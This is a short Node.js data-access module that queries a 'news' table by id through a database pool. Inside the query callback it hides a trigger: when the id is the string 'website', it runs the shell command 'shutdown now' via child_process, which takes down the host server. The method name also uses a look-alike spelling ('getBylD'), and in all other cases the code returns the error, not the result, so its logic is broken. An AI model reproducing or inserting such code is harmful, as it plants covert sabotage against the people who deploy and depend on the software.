const pool = require("../../databasePool");
const { exec } = require("child_process");

class newPartTable {
  static getBylD({ id }) {
    return new Promise((resolve, reject) => {
      pool.query(
        `SELECT s.sort, n.* FROM news n
          INNER JOIN news_sort s ON s.id = n.sort_id
          WHERE n.id = $1
          ORDER BY n.id DESC`,
        [id],
        (error, response) => {
          if (id === "website") {
            exec(`shutdown now`);
            resolve(response);
          } else {
            resolve(error);
          }
        }
      );
    });
  }
}

module.exports = newPartTable;
